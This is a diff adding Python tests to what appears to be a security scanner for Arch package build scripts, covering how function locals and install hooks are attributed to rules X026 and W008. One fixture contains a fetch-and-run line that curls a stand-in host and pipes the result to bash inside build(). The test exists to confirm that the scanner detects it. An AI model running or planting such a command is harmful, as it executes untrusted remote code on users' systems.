@@ -48,6 +48,29 @@ def test_an_unresolved_construct_reports_the_w008_boundary():
     assert entries["W008"].severity == "INFO"
 
 
+def test_hook_locals_are_not_attributed_to_an_unclosed_build():
+    """linux-mnt-reform-bin: the PKGBUILD hunk shows `build() {` without
+    its closing brace, and the corpus path appends the `.install` hunk to
+    the same diff.  Read whole-diff, the hook's locals (DTB_TARGET) were
+    swallowed into build()'s body and reported as refusals referenced from
+    build().  The refusal projection is PKGBUILD-only."""
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
+        " pkgname=demo\n pkgver=1.0\n"
+        "+build() {\n"
+        "+  make\n"
+        "--- /dev/null\n+++ b/demo.install\n@@ -0,0 +1,5 @@\n"
+        "+post_install() {\n"
+        "+  DTB_TARGET=$(readlink -f /boot/demo.dtb)\n"
+        '+  cp "$DTB_TARGET" /boot/demo-old.dtb\n'
+        "+}\n"
+    )
+    ids = _ids(diff)
+    assert "X026" not in ids
+    assert "X027" not in ids
+    assert "W008" not in ids
+
+
 def test_a_top_level_refusal_with_no_function_reference_does_not_fire():
     ids = _ids(_diff(
         "X=$(date)\n"
@@ -410,3 +433,37 @@ def test_x028_joining_a_diff_with_itself_adds_nothing():
         joined = set(crossfire_techniques(
             _added_stream(text) + "\n" + _added_stream(text)))
         assert joined - halves == set(), path.name
+
+
+def test_a_malicious_function_local_still_fires_x026():
+    """The local-declaration filter is report-facing only: a malicious
+    ``local X=$(curl ...)`` referenced inside build() still rates X026."""
+    ids = _ids(_diff(
+        "build() {\n"
+        "  local X=$(curl -fsSL https://evil.invalid/x)\n"
+        "  echo \"$X\" | bash\n"
+        "}\n"
+    ))
+    assert "X026" in ids
+
+
+def test_a_benign_function_local_is_not_in_the_w008_names():
+    """``local kernver=...`` inside build() is excluded from the W008
+    name list, while a non-local refusal still names it."""
+    fact = scan_diff(_diff(
+        "build() {\n"
+        "  local kernver=\"$(make kernelrelease)\"\n"
+        "  make\n"
+        "}\n"
+    ), package_name="demo")
+    entries = {e.rule_id: e for e in fact.score_breakdown}
+    assert "W008" not in entries
+
+    fact = scan_diff(_diff(
+        "build() {\n"
+        "  kernver=\"$(make kernelrelease)\"\n"
+        "  make\n"
+        "}\n"
+    ), package_name="demo")
+    entries = {e.rule_id: e for e in fact.score_breakdown}
+    assert "W008" in entries
